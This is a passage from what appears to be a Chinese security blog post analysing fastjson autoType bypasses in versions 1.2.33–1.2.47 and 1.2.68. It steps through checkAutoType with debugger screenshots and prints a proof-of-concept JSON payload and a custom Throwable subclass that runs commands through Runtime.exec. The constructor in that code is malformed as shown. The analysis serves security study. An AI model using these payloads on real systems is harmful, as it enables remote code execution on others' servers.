</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&#34;autoCommit&#34;</span>: <span style="color:#fff;font-weight:bold">true</span>
</span></span><span style="display:flex;"><span>	}
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>com.sun.rowset.JdbcRowSetImpl</code>的<code>className</code>还来得及进行<code>mappings</code>的判断，就被黑名单干掉了，报错了。</p>
<p>因此autoTypeSupport开启的时候，，payload不起效果</p>
<h6 id="autotypesupport为false">autoTypeSupport为false<a hidden class="anchor" aria-hidden="true" href="#autotypesupport为false">#</a></h6>
<p>如上面的分析一样，如果autoTypeSupport为false，那么在进行<code>if(!autoTypeSupport)</code>前，即执行黑白名单判断前，就会先执行<code>getClassFromMapping</code>方法和<code>findClass</code>方法。</p>
<p>那么在解析第一段<code>payload</code>的时候，直接就可以通过<code>clazz = this.deserializers.findClass(typeName);</code>获得反序列化器<code>MiscCodec</code>，并将<code>clazz</code>赋为<code>java.lang.class</code>，然后程序因为<code>clazz</code>不为空，直接返回<code>clazz</code>，这样就跳过了黑白名单的审查。然后后续<code>MiscCodec</code>的<code>deserialze</code>方法将val对应的值<code>com.sun.rowset.JdbcRowSetImpl</code>加入到<code>mappings</code>中。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230419183000247.png" alt="image-20230419183000247"  />
</p>
<p>然后在解析第二段<code>payload</code>的时候，<code>TypeUtils.getClassFromMapping(typeName)</code>直接从<code>mappings</code>中获取缓存的类名，然后直接返回。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230419183315468.png" alt="image-20230419183315468"  />
</p>
<p>之后的反序列化就不再讲了。</p>
<h5 id="1233--fastjson--1247">1.2.33 &lt;= fastjson &lt;= 1.2.47<a hidden class="anchor" aria-hidden="true" href="#1233--fastjson--1247">#</a></h5>
<p><code>1.2.33~1.2.47</code>之间的<code>checkAutoType</code>方法和之前的有所改动，只有识别到类在黑名单中并且同时无法从<code>mappings</code>中获取，才会报错autoType is not support。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230419184017575.png" alt="image-20230419184017575"  />
</p>
<h6 id="autotypesupport为true-1">autoTypeSupport为true<a hidden class="anchor" aria-hidden="true" href="#autotypesupport为true-1">#</a></h6>
<p>第一段<code>payload</code>直接通过<code>clazz = this.deserializers.findClass(typeName);</code>，找到反序列化器<code>MiscCodec</code>，然后通过它的<code>deserize</code>方法实现将<code>val</code>的值<code>com.sun.rowset.JdbcRowSetImpl</code>添加到<code>mappings</code>中。</p>
<p>第二段<code>payload</code>因为<code>com.sun.rowset.JdbcRowSetImpl</code>在<code>mappings</code>中存储着，所以可以直接过黑名单的报错，然后通过<code>clazz = TypeUtils.getClassFromMapping(typeName)</code>获得对应的<code>clazz</code>，最后执行它的反序列化。</p>
<h6 id="autotypesupport为false-1">autoTypeSupport为false<a hidden class="anchor" aria-hidden="true" href="#autotypesupport为false-1">#</a></h6>
<p>利用链和<code>autoTypeSupport</code>为true的情况一样。</p>
<p>实际上，这个版本的<code>fastJson</code>实现的是对黑名单报错额外加条件(缓存mappings中没有该类)导致的。</p>
<h3 id="fastjson-1268">fastjson-1.2.68<a hidden class="anchor" aria-hidden="true" href="#fastjson-1268">#</a></h3>
<p>在 1.2.47 版本漏洞爆发之后，官方在 1.2.48 对漏洞进行了修复，在 <code>MiscCodec</code> 处理 Class 类的地方，设置了cache 为 false ，并且 <code>loadClass</code> 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去。</p>
<p><code>MisCodec</code>的<code>deserialze</code>方法中调用<code>TypeUtils.loadClass</code>方法。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230419234445180.png" alt="image-20230419234445180"  />
</p>
<p><code>loadClass</code>默认的cache也设置为false</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230419234427409.png" alt="image-20230419234427409"  />
</p>
<p>这个安全修复为 fastjson 带来了一定时间的平静，直到 1.2.68 版本出现了新的漏洞利用方式。</p>
<blockquote>
<p>影响版本：<code>fastjson &lt;= 1.2.68</code>
描述：利用 expectClass 绕过 <code>checkAutoType()</code> ，实际上也是为了绕过安全检查的思路的延伸。主要使用 <code>Throwable</code> 和 <code>AutoCloseable</code> 进行绕过。</p>
</blockquote>
<p>版本 1.2.68 本身更新了一个新的安全控制点 safeMode，如果应用程序开启了 safeMode，将在 <code>checkAutoType()</code> 中直接抛出异常，也就是完全禁止 autoType，不得不说，这是一个一劳永逸的修复方式。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014202847981.png" alt="image-20221014202847981"  />
</p>
<p>但与此同时，这个版本报出了一个新的 <code>autoType</code> 开关绕过方式：利用 <code>expectClass</code> 绕过 <code>checkAutoType()</code>。</p>
<p>在 <code>checkAutoType()</code> 函数中有这样的逻辑：如果函数有 <code>expectClass</code> 入参，且我们传入的类名是 <code>expectClass</code> 的子类或实现，并且不在黑名单中，就可以通过 <code>checkAutoType()</code> 的安全检测。(<code>isAssignableFrom(clazz) </code>判定此 <code>Class</code> 对象所表示的类或接口与指定的 <code>Class</code> 参数所表示的类或接口是否相同，或是否是其超类或超接口)。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014203353318.png" alt="image-20221014203353318"  />
</p>
<p>接下来我们找一下 <code>checkAutoType()</code> 几个重载方法是否有可控的 <code>expectClass</code> 的入参方式，最终找到了以下几个类：</p>
<ul>
<li><code>ThrowableDeserializer#deserialze()</code></li>
<li><code>JavaBeanDeserializer#deserialze()</code></li>
</ul>
<h4 id="throwabledeserializer利用">ThrowableDeserializer利用<a hidden class="anchor" aria-hidden="true" href="#throwabledeserializer利用">#</a></h4>
<p>如果传入的是<code>java.lang.Throwable</code>类，那么其对应的反序列化解析器为<code>ThrowableDeserializer</code>。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420011313060.png" alt="image-20230420011313060"  />
</p>
<p><code>ThrowableDeserializer#deserialze()</code> 方法直接将 <code>@type</code> 后的类传入 <code>checkAutoType()</code> ，并且 expectClass 为 <code>Throwable.class</code>。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014203518433.png" alt="image-20221014203518433"  />
</p>
<p>通过 <code>checkAutoType()</code> 之后，将使用 <code>createException</code> 来创建异常类的实例。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014203606317.png" alt="image-20221014203606317"  />
</p>
<p>这就形成了 <code>Throwable</code> 子类绕过 <code>checkAutoType()</code> 的方式。我们需要找到 <code>Throwable</code> 的子类，这个类的 <code>getter/setter/static block/constructor</code> 中含有具有威胁的代码逻辑。</p>
<p>因为<code>Throwable</code>类既没有在黑白名单里面，也不在缓存里面，所以我们不能直接指定<code>ExpectClas</code>为<code>Throwable</code></p>
<p><code>java.lang.Exception</code>继承了<code>Throwable</code>类，并且也在<code>mappings</code>中的缓存。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420013213376.png" alt="image-20230420013213376"  />
</p>
<p>这里我们自定义实现了一个继承了<code>Throwable</code>类的子类。</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> com.reus09.Evil;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName ExecException
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2023/4/20 01:08
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> ExecThrowable <span style="color:#fff;font-weight:bold">extends</span> Throwable{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> String domain;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#fff;font-weight:bold">public</span>(String domain){
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>            Runtime.<span style="color:#007f7f">getRuntime</span>().<span style="color:#007f7f">exec</span>(domain);
</span></span><span style="display:flex;"><span>        } <span style="color:#fff;font-weight:bold">catch</span> (IOException e) {
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String getDomain() {
</span></span><span style="display:flex;"><span>				
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> domain;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> setDomain(String domain) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">domain</span> = domain;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String getMessage() {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">super</span>.<span style="color:#007f7f">getMessage</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们的<code>Poc</code>如下：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="font-weight:bold">&#34;@type&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;java.lang.Exception&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;com.reus09.Evil.ExecThrowable&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="font-weight:bold">&#34;domain&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;open /System/Applications/Calculator.app&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="调试-1">调试<a hidden class="anchor" aria-hidden="true" href="#调试-1">#</a></h5>
<p>第一次是传入java.lang.Exception类进行校验，这里CheckAutoType()函数的expectClass参数是为null的：</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420013717973.png" alt="image-20230420013717973"  />
</p>
<p>接着直接从缓冲<code>mappings</code>中获取到了<code>java.lang.Exception</code>类</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420013830945.png" alt="image-20230420013830945"  />
</p>
<p>然后判断clazz是否 不是expectClass类的继承类且不是HashMap类型，是的话抛出异常，否则直接返回该类。这里没有expectClass就直接返回<code>java.lang.Exception</code>类：</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420014015758.png" alt="image-20230420014015758"  />
</p>
<p>然后回到<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code>方法，因为我们的<code>java.lang.Exception</code>实际上是<code>Throwable</code>类的子类，所以它的反序列化器为<code>ThrowableDeserializer</code>。然后调用<code>ThrowableDeserializer</code>的deserialize方法。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420014347635.png" alt="image-20230420014347635"  />
</p>
<p>在<code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze</code>的方法里面，<code>exClassName</code>获取POC中下一个@type指定的ClassName，然后再次调用<code>checkAutoType</code>函数，并且传入的<code>expectClass</code>为<code>Throwable</code>。<img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420014520052.png" alt="image-20230420014520052"  />
</p>
<p><code>com.reus09.Evil.ExecThrowable</code>这个类是我们自定义的，不是黑、白名单上面的类，也不存在缓存mappings中，并且因为传入的<code>expectClass</code>是<code>Throwable</code>类，我们自定义类是<code>Throwable</code>的子类，因此<code>expectClassFlag</code>为true。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420015047001.png" alt="image-20230420015047001"  />
</p>
<p>接着会绕过黑白名单的检测，经过<code>autoTypeSupport</code>为true或false的两种情况的检查，由于expectClassFlag为true，进入如下的loadClass()逻辑来加载目标类，由于AutoType关闭且jsonType为false，因此调用loadClass()函数的时候是不开启cache即缓存的：</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420015325128.png" alt="image-20230420015325128"  />
</p>
<p>使用<code>AppClassLoader</code>来加载<code>com.reus09.Evil.ExecThrowable</code>类并返回。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420015439609.png" alt="image-20230420015439609"  />
</p>
<p>接着判断jsonType，如果为true的话直接添加Mapping缓存并返回类，否则接着判断返回的类是否是ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常，这实现过滤大多数JNDI注入Gadget：</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420015719196.png" alt="image-20230420015719196"  />
</p>
<p>往下，如果expectClass不为null，则判断目标类是否是expectClass类的子类，是的话就添加到Mapping缓存中并直接返回该目标类，否则直接抛出异常导致利用失败，因此这里恶意类必须要实现<code>Throwable</code>类</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420015805147.png" alt="image-20230420015805147"  />
</p>
<p><code>checkAutoType</code>调用完后，就执行<code>createException</code>函数来创建异常类的实例，在里面反射调用构造函数，然后实例化。实现触发漏洞。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420020330889.png" alt="image-20230420020330889"  />
</p>
<h4 id="javabeandeserializer利用">JavaBeanDeserializer利用<a hidden class="anchor" aria-hidden="true" href="#javabeandeserializer利用">#</a></h4>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">if</span> (expectClass == <span style="color:#fff;font-weight:bold">null</span>) {     
</span></span><span style="display:flex;"><span>  expectClassFlag = <span style="color:#fff;font-weight:bold">false</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#fff;font-weight:bold">else</span> <span style="color:#fff;font-weight:bold">if</span> (expectClass != Object.<span style="color:#007f7f">class</span> &amp;&amp; expectClass != Serializable.<span style="color:#007f7f">class</span> &amp;&amp; expectClass != Cloneable.<span style="color:#007f7f">class</span> &amp;&amp; expectClass != Closeable.<span style="color:#007f7f">class</span> &amp;&amp; expectClass != EventListener.<span style="color:#007f7f">class</span>  &amp;&amp; expectClass != Iterable.<span style="color:#007f7f">class</span> &amp;&amp; expectClass != Collection.<span style="color:#007f7f">class</span>) {
</span></span><span style="display:flex;"><span>  expectClassFlag = <span style="color:#fff;font-weight:bold">true</span>;
</span></span><span style="display:flex;"><span>}<span style="color:#fff;font-weight:bold">else</span>{  
</span></span><span style="display:flex;"><span>  expectClassFlag = <span style="color:#fff;font-weight:bold">false</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>对于这段代码来说，我们需要找到一个符合要求的期望类，不是<code>object、Serializable、Cloneable、Closeable、EventListener、Iterable、Collection</code>这些类，并且他也不能在黑名单里面<code>https://github.com/LeadroyaL/fastjson-blacklist</code>，并且这个类需要在缓存mappings中，找到了<code>java.lang.AutoCloseable</code>和<code>java.util.BitSet</code>两个接口。</p>
<p>这里我们自定义实现了一个继承了<code>AutoCloseable</code>类的子类。</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> com.reus09.Evil;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.Closeable;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.IOException;
